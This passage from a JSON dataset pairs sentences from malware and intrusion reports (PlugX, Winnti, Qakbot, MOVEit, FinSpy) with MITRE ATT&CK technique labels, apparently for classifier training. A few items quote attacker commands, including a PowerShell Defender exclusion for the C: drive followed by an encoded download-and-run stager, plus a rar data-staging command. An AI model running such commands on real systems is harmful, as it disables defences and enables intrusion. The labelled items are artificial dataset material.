    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "For example: hxxp://sery.brushupdata.com/B4BBDCC029E119719F065622 hxxp://sery.brushupdata.com/07FDB1B97D22EE6AF2482B1B hxxp://sery.brushupdata.com/273CDC0B9C6218BC1187556D Other PlugX samples we observed injected themselves into Windows Media Player and started a connection with the following two domains: center.asmlbigip.com sec.asmlbigip.com ",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Hello Winnti Another mechanism observed was to start a program as a service",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "The file the adversary was using seemed to be a backdoor that was using the DLL file format (2458562ca2f6fabddae8385cb817c172). ",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "The DLL is used to create a malicious service and its name is “service.dll”.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "The name of the created service, “SysmainUpdate”, is usurping the name of the legitimate service “SysMain” which is related to the legitimate DLL sysmain.dll and also to the Superfetch service.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "The dll is run using the command “rundll32.exe SuperFrtch.dll, #1”.",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "Once the fingerprinting has been done, the malware will install the malicious service using the API RegisterServiceHandlerA then SetServiceStatus, and finally CreateEventA.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "The malware also decrypts and injects the payload in memory.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "[data from location] 0% OK Another indicator of discovering Winnti malware was the following execution path we discovered in the command line dump of the memory: ",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "The malware was injected into a SVCHOST process where a driver location pointed to the config file.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "We observed in the process dump the exfiltration of data on the system, such as OS, Processor (architecture), Domain, Username, etc. ",
    "command": "",
    "labels": [
      "T1033",
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Chrome/57.0.2987.133 Safari/537.36 Other Persistence Activities WMI activity [T1546.003] was also observed to execute commands on the systems. ",
    "command": "",
    "labels": [
      "T1047",
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "From a persistence point of view, scheduled tasks [T1053.005] and the use of valid accounts [T1078] acquired through the use of Mimikatz, or creating LSASS dumps, were observed being employed during the length of the campaign. ",
    "command": "",
    "labels": [
      "T1003.001",
      "T1053.005",
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "When running the file from the command line, the following output was observed: Figure 5 PsExec output The error notification and the ‘Impacket’ keyword tipped us off and, after digging around, we found more.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "In some cases, batch (.bat) scripts were created to gather information from certain network shares/folders and use the ‘rar’ tool to compress them to a certain size [T1020]",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Example of content in a batch script: C:\\Windows\\web\\rar.exe a -[redacted] -r -v50000",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "[Target-directory] On other occasions, manual variants of the above command were discovered after using the custom backdoor as described earlier. ",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "When the data was gathered on a local system using the backdoor, the files were exfiltrated over the backdoor and the rar files were deleted [T1070.004].",
    "command": "",
    "labels": [
      "T1005",
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "Where external facing assets were used, like a web server, the data was stored in a location in the Internet Information Services (IIS) web server and exfiltrated over HTTP using GET requests towards the exact file paths [T1041] [T1567] [T1071]. ",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "After that, using Mimikatz and dumping lsass, they were looking to get valid accounts.",
    "command": "",
    "labels": [
      "T1003.001",
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "After executing this command and analyzing the memory, we observed a process injection in one of the svchost processes whereby one particular file was loaded from the following path: C:\\programdata\\microsoft\\windows\\caches\\ieupdate.dll Figure 11",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "UDP Port 20502 TCP Port 20501 Figure 12 Network connections to C2 Capturing the traffic from the malware we observed the following as an example: Figure 13 Winnti HTTP traffic to C2 The packet data was customized and sent through a POST request with several headers towards the C2.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "MITRE ATT&CK Techniques Technique ID Technique Title Context Campaign T1190 Exploit Public-facing application Adversary exploited a web-facing server with application T1105 Ingress Tool transfer Tools were transferred to a compromised web-facing server T1083 File & Directory Discovery Adversary browsed several locations to search for the data they were after. ",
    "command": "",
    "labels": [
      "T1083",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "T1570 Lateral Tool Transfer Adversary transferred tools/backdoors to maintain persistence T1569.002 System Services: Service Execution Adversary installed custom backdoor as a service T1068 ",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "The exploitation of Privilege Escalation Adversary used Rotten/Bad Potato to elevate user rights by abusing API calls in the Operating System. ",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "T1543.003 Create or Modify System Process: Windows Service Adversary launched backdoor and some tools as a Windows Service including adding of registry keys T1546.003 Event-Triggered Execution: WMI Event Subscription WMI was used for running commands on remote systems T1053.005 Scheduled task Adversary ran scheduled tasks for persistence of certain malware samples T1078 Valid accounts Using Mimikatz and dumping of lsass, the adversary gained credentials in the network T1020 Automated exfiltration The PlugX malware exfiltrated data towards a C2 and received commands to gather more information about the victim’s compromised host. T1030 Data transfer size limits Adversary limited the size of rar files for exfiltration T1070.004 Indicator removal on host Where in the beginning of the campaign the adversary was sloppy, during the last months of activity they became more careful and started to remove evidence T1041 Exfiltration over C2 channel Adversary used several C2 domains to interact with compromised hosts. ",
    "command": "",
    "labels": [
      "T1003.001",
      "T1047",
      "T1053.005",
      "T1078",
      "T1112",
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "After obtaining initial network access, the attacker would run a network recognition process to find the IP address of each of the ATMs.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "With that information in hand, the attackers would launch a lateral movement phase, using default Windows credentials and then installing custom-crafted malware in the desired systems.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Hook code added into CloseHandle process All captured information from the transaction is saved to an encrypted file placed in a directory previously set by the malware configuration.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "Reboot, SendKeys, ShowForm, Inject, UnInject, HideForm, Recursos, GetZip, SetStartup, PausaProcesso, LiberaProcesso, Debug, SendSnapShot, GetStartup, CapRegion, CapFerro, KillProcess, Shell, Process, GetModules, GetConfig, StartSendScreen, StopSendScreen, ReLogin, StartScan, GetKey, SetConfig, RefreshScreen, Download, TakeRegions, Enviar Arquivo, ScanProcessStart, ScanProcessStop, StartRegiao, StopRegiao, StartDownload, StopDownload. ",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Command Description Download Download a file from the remote server Shell Execute a specified command via CMD GetConfig Get the configuration file KillProcess Terminate a process SetStartup Add the process to a startup registry key StartSendScreen Start screen capture StopSendScreen Stop screen capture Uploader Module This module is responsible for checking the directory specified in the CABPATH parameter in the config file and sending all cab files generated from the stolen transactions to the server; the files are sent through an HTTP POST request.",
    "command": "",
    "labels": [
      "T1059.003",
      "T1071.001",
      "T1105",
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "title: The Rising Trend of OneNote Documents for Malware delivery url: https://www.mcafee.com/blogs/other-blogs/mcafee-labs/rising-trend-of-onenote-documents-for-malware-delivery/ Authored By Anandeshwar Unnikrishnan,Sakshi Jaiswal,Anuradha M McAfee Labs has recently observed a new Malware campaign which used malicious OneNote documents to entice users to click on an embedded file to download and execute the Qakbot trojan. ",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "We have observed that most of the malicious documents either have Windows batch script that invokes Powershell for dropping the malware on the system or Visual Basic scripts that does the same. ",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Figure 8 OneNote directory in Temp By analyzing numerous malicious documents, we have been able to create a “test” OneNote document that executes a batch file that contains the “whoami” command.",
    "command": "",
    "labels": [
      "T1033",
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "The image in Figure 9 show the batch file being created in the user’s temp location. ",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "The OneNote contained aHTA file that once executed would make use of the curl utility to download Qakbot and then execute it. ",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "OneNote file contains an embedded HTA attachment and a fake message to lure users to execute the HTA file The HTA file uses curl utility to download the Qakbot payload and is executed by rundll32.exe. ",
    "command": "",
    "labels": [
      "T1105",
      "T1204.002",
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "Once this OneNote file is opened, it prompts the user with a fake message to double-click on open to view the attachment. ",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "Figure 11 OneNote Template Upon clicking the Open button, it drops the HTA file with the name Open.hta to the %temp%",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "The HTA file contains obfuscated script as shown below: Figure 13 Obfuscated HTA script The HTA file is loaded by MSHTA and creates a registry key in HKEY_CURRENT_USER\\SOFTWARE\\ with obfuscated content as shown below: Figure 14 Registry key creation ",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Finally, MSHTA calls this function by passing the malicious URL as a parameter and then deletes the registry key as shown in Block 2. ",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "De-obfuscated content from the HTA file is shown below: Figure 15 Deobfuscated HTA content Curl is used to download the malicious DLL file in C:\\ProgramData Folder with .png extension.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The script will then execute the downloaded file with Rundll32.exe with the export function Wind. ",
    "command": "",
    "labels": [
      "T1105",
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "The message above the ‘Open’ button instructs the user to “double click” in order to receive the attachment. ",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "By moving the icons aside, we can see the malicious batch file which when executed downloads the payload from the Internet and executes on the target system. ",
    "command": "",
    "labels": [
      "T1059.003",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Figure 20 Hidden Malicious dropper script Execution Of Payload Dropper Upon execution of the batch file, Powershell will be invoked and it fetch the Qakbot payload from Internet and execute it on the target system.",
    "command": "",
    "labels": [
      "T1059.003",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The Figure 21 Show the process tree after the execution of the script and you can see that powershell.exe was launched by cmd.exe and the parent of cmd.exe is onenote.exe. ",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "The base64 decoded batch file is shown in Figure 23. ",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "This will use powershell to download the payload and then execute it with rundll32.exe Figure 23 Base64 Decoded instructions in dropper IOCS Type Value Product Detected Campain 2 – Zip File 000fb3799a741d80156c512c792ce09b9c4fbd8db108d63f3fdb0194c122e2a1 Total Protection and LiveSafe VBS/Qakbot.a Campain 2 – OneNote File 2bbfc13c80c7c6e77478ec38d499447288adc78a2e4b3f8da6223db9e3ac2d75 Total Protection and LiveSafe One/Downloader.a Campain 2 – Powershell File b4dd3e93356329c076c0d2cd5ac30a806daf46006bdb81199355952e9d949424 Total Protection and LiveSafe PS/Agent.gs Campain 2 – OneNoteFile a870d31caea7f6925f41b581b98c35b162738034d5d86c0c27c5a8d78404e860 Total Protection and LiveSafe VBS/Qakbot.a Domains: starcomputadoras.com Conclusion: Malware authors are getting more sophisticated when it comes to hiding their payloads.",
    "command": "",
    "labels": [
      "T1105",
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "Mandiant has observed several POST requests made to the legitimate guestaccess.aspx file before interaction with the LEMURLOOT webshell, indicating SQLi attacks were directed towards that file. ",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "LEMURLOOT provides functionality tailored to execute on a system running MOVEit Transfer software, including the ability to generate commands to enumerate files and folders, retrieve configuration information, and create or delete a user with a hard-coded name.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Mandiant is aware of multiple cases where large volumes of files have been stolen from victims' MOVEit transfer systems.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "Many of the hosts used to support these second-stage operations hosted RDP services with certificates generated between May 19 and 22, which is suggestive of when this infrastructure may have been staged. ",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "The malware authenticates incoming connections via a hard-coded password and can run commands that will download files from the MOVEit Transfer system, extract its Azure system settings, retrieve detailed record information, create and insert a particular user, or delete this same user.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "It then performs SQL queries to retrieve files, file size, folders, file owners, and institution name data.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "[T1562.001]: powershell try{Add-MpPreference -ExclusionPath 'C:\\'; Write-Host 'added-exclusion'} catch {Write-Host 'adding-exclusion-failed' }; powershell -enc \"$BASE64 encoded payload to download next stage and execute it\" The exclusion rule allowlisted the entire c:\\drive, enabling threat actors to download tools to the c:\\drive without virus scans.",
    "command": "",
    "labels": [
      "T1105",
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "The exploit payload then downloaded mdeploy.text from 182.54.217[.]2/mdepoy.txt to C:\\users\\public\\mde.ps1",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "When executed, mde.ps1 downloaded file.zip from 182.54.217[.]2 and removed mde.ps1 from the disk [T1070.004]. file.zip contained XMRig cryptocurrency mining software and associated configuration files. ",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "The Scheduled Task was named RuntimeBrokerService.exe to masquerade as a legitimate Windows task. ",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "After obtaining initial access and installing XMRig on the VMWare Horizon server, the actors used RDP [T1021.001] and the built-in Windows user account DefaultAccount",
    "command": "",
    "labels": [
      "T1021.001",
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "The actors were able to proxy [T1090] RDP sessions, which were only observable on the local network as outgoing HTTPS port 443 connections to tunnel.us.ngrok[.]com and korgn.su.lennut[.]com (the prior domain in reverse).",
    "command": "",
    "labels": [
      "T1021.001",
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "[M1016],[M1051]. Execution Technique Title ID Use Recommendation Command and Scripting Interpreter: PowerShell T1059.001 The actors ran PowerShell commands that added an exclusion rule to Windows Defender. ",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "The patched launcher: Patches the function of the OS loader that transfers execution to the kernel The patched function hooks the kernel’s PsCreateSystemThread function, which, when called for the first time, creates an additional thread that decrypts the next loader stage and launches it. ",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "The next stage: Locates the Trojan loader file on the EFI partition and decrypts it Waits until a user logs on and injects the Trojan loader into exe. ",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The last hook in the chain creates a thread in the kernel that injects the next stage into winlogon.exe. ",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "It is as follows: A thread with trampoline shellcode is created inside exe. ",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "This roundabout way of injecting code is intended to trick security solutions. ",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The injected Trojan loader is the same as the UEFI one. ",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "In short, the attack scenario is as follows: ",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "The victim downloads a Trojanized application and executes it. ",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "The Pre-Validator downloads Security Shellcodes from the C2 server and executes them.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Each shellcode collects specific system information (e.g. the current process name) and uploads it back to the server. ",
    "command": "",
    "labels": [
      "T1057",
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "The Post-Validator collects information that allows it to identify the victim machine (running processes, recently opened documents, screenshots) and sends it to a C2 server specified in its configuration. ",
    "command": "",
    "labels": [
      "T1005",
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "For example, a call to the CreateWindowExW function has been replaced: The original (left) and patched (right) code of the backdoored application This trampoline is protected with an obfuscator that we dubbed FinSpy Mutator.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "It launches a code that: Decrypts and launches a slightly modified Metasploit Reverse HTTPS stager.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The Metasploit stager connects to a configured C2 server using HTTPS for communication.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "On startup, it: Hooks the NtTerminateProcess and ExitProcess functions to make sure the Pre-Validator continues working if the backdoored application is closed.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "The hooked functions close all the application’s windows but do not terminate its process. ",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Makes an initial POST request to the C2 server.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "On receiving it, the Pre-Validator: Decrypts and executes the received Security Shellcode Sends the shellcode execution results to the C2 server via a POST request. ",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "3 Returns the user’s profile folder (e.g. C:\\Users\\username) 4 Returns the short form of the user’s profile folder (e.g. C:\\Users\\abcdef~1) 5 Returns the type of the drive containing the backdoored application (e.g. removable drive) 6 Returns process names of the current process tree (i.e. the current process, the parent process, the grandparent process, etc.) 7 Returns the path to the ‘Program Files’ folder. ",
    "command": "",
    "labels": [
      "T1057",
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": ", returns: Overall available space Space available to current user (may be less than overall available space due to quotas) Disk capacity 9 Returns the path to the user’s temporary folder. 10 Returns the list of network adapter types, IP and MAC addresses assigned to them. 11 Returns the list of running processes 12 Returns ProcessDebugPort value returned by NtQueryInformationProcess for current process. 13 Returns ProcessDebugObjectHandle value returned by NtQueryInformationProcess for current process. 14 Returns TotalNumberOfObjects and TotalNumberOfHandles values of objects created by NtCreateDebugObject. ",
    "command": "",
    "labels": [
      "T1016",
      "T1057",
      "T1082",
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "15 Returns the current user’s SID. ",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "17 Returns OSVERSIONINFOEXW and SYSTEM_INFO structures. ",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "18 Returns information about the machine’s BIOS. ",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "19 Returns the list of object names in the \\GLOBAL??",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "directory. ",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "20 Returns information about the operating system. ",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "21 Returns the current user’s name, computer name, path to the current executable, its name and command line path. ",
    "command": "",
    "labels": [
      "T1033",
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "27 Returns information about the computer system (from SELECT *",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "FROM Win32_ComputerSystem WMI query) 28 Returns the list of connected PCI devices. 29 Returns names of shortcuts in the Desktop directory. ",
    "command": "",
    "labels": [
      "T1047",
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "32 Returns the current domain SID. ",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "33 Cleans API functions potentially hooked by security solutions: Nt* functions in ntdll.dll and all exported functions in kernel32.dll, kernelbase.dll and advapi32.dll. ",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "The file names are hardcoded in the dropper but are unique for each sample and appear to be randomly generated. ",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "Creates a scheduled task that runs at system startup and launches the Post-Validator Loader via regsvr32 (task action:",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "The Task Scheduler launches it at system startup through regsvr32.exe.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "Sample scheduled task properties The launched shellcode decrypts the Post-Validator (it is stored in the same file with the shellcode) with RC4 (key: domain SID) and reflectively loads it. ",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "0x8070A0 Retrieve the list of files with data prepared for exfiltration. ",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "If the prepared file name is: 201a, obtains the list of processes and sends it to the C2 server. 201b, gets the list of recent files and sends it to the C2 server. 243a, takes a screenshot and uploads it to the C2 server. 0x8054A0, 0x805BA0, 0x8056A0, 0x805DA0, 0x8057A0, 0x805EA0 ",
    "command": "",
    "labels": [
      "T1057",
      "T1083",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Commands are used to download and install plugins. ",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Commands are used to download and run the Trojan Installer. ",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Once the working directory is prepared, the Installer launches the Trojan. ",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "The Initial Loader The Initial Loader is a DLL that is launched on every startup by rundll32.exe (the Trojan adds it to the HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run key, the value name is unique for each sample).",
    "command": "",
    "labels": [
      "T1218.011",
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "The Trojan Loader The 32-bit Trojan Loader, which is launched regardless of the victim machine architecture, checks if it is running on a 64-bit system.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "On KDE, it copies a Bash script to either ~/.kde4/Autostart/udev2.sh or ~/.kde/Autostart/udev2.sh.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Similar to a network worm which infects machines in the local network, the ProcessWorm is injected into all running processes.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "On startup, the Hider loads a clean copy of ntdll.dll from disk, which is used when calling API functions from this library. ",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "It works as follows: The Hider encrypts the Orchestrator’s pages with a cipher based on XOR and ROL operations and assigns the PAGE_NOACCESS attribute to them When the Orchestrator accesses hidden pages, the operating system generates an ACCESS_VIOLATION exception The Hider detects the generated exception through the hook of the KiUserExceptionDispatcher function, which handles dispatching of all exceptions The hooked function decrypts the hidden page and assigns it the PAGE_EXECUTE_READWRITE attribute, thus handling the exception The Hider conceals the unhidden pages again within 30 seconds. ",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "When the Orchestrator starts up, it: Hooks its own IAT (import address table) to alter the behavior of WinAPI file manipulation functions.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "The Orchestrator needs these hooks to interact with the VFS. ",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "Sets up persistence by creating an entry in the HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run registry key. ",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "Once initialized, the Orchestrator launches its following components, which we will detail below: The application watcher that looks for specific processes and notifies the C2 server when they are started or stopped The ProcessWorm injector that injects the ProcessWorm into processes that are not infected with this component The recording manager thread that controls data to be exfiltrated to the C2 server The C2 server communicator thread. ",
    "command": "",
    "labels": [
      "T1055",
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "The application watcher The application watcher regularly examines all the processes on the system, looking for applications specified in the Orchestrator configuration.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "When it detects a starting first (or a stopping last) instance of a process from the list in the configuration, an appropriate event will be reported to the C2 server during heartbeat time.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "It is notable that the application watcher acquires handles for all running processes on the system, which results in either winlogon.exe or explorer.exe obtaining numerous process handles. ",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Just like the application watcher, the injector regularly obtains the list of running processes.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "For every process, it verifies whether the ProcessWorm is running inside it and injects the ProcessWorm if needed. ",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The recording manager Over the course of their execution, plugins may save recording files in the working directory (e.g. keylogs, screenshots or printed files).",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "Every recording file stored in the working directory has the following name format: <plugin prefix><recording type prefix><five-digit random number>.<extension> The plugin prefix, the extension and the recording type prefix depend on the ID of the plugin that created the recording.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "0x8076A0, 0x807AA0 Delete a recording with a given filename from the system. ",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "Miscellaneous commands 0x8018A0 ",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "Uninstall the backdoor.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "This command wipes all the files and registry keys created by the backdoor, as well as restores the MBR and the EFI Windows Boot Manager (provided they were infected) from backups. ",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "For example, virtual files can be created or opened via the hooked CreateFileW API.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "The ProcessWorm ",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The malware injects the ProcessWorm into all processes running on the system.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Its main purpose is to extract specific information about running processes and send it to the Orchestrator or the plugins. ",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "The ProcessWorm can be injected to processes in two ways – either by spawning a remote thread with the shellcode or by creating an APC (Asynchronous Procedure Call) with the procedure address pointing to the start of the shellcode.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "While the loader used with the first injection method is simple, the one invoked in case of APC injections is rather interesting.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The asynchronous procedure places a hook on the NtTestAlert function and then exits.",
    "command": "",
    "labels": [
      "T1055",
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "When the process executable is loaded, ntdll.dll will call the NtTestAlert function.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Its modified version will first call the original NtTestAlert function and then invoke the ProcessWorm reflective loader. ",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "This code obtains the address of the destination API function by XOR-ing two numbers and then jumps to it. ",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Example of junk code created by the ProcessWorm loader, useful instructions are highlighted in yellow While executing its worm-like activity, the ProcessWorm injects itself into processes created by the process that are already infected with this component.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "To do that, it places a hook on the CreateProcessInternalW API function.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "If the new process is not created with a DEBUG_PROCESS or a DEBUG_ONLY_THIS_PROCESS flag, the hooked process creation function clears a possible hook of the NtQueueAPCThread function and then uses it to create an APC procedure in the new process.",
    "command": "",
    "labels": [
      "T1055",
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "When the new process starts up, the ProcessWorm will be loaded with the help of the APC injection loader. ",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "It can conceal the malware’s working directory, services, registry keys, C2 server addresses, as well as filter out event logs related to the malicious activity.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
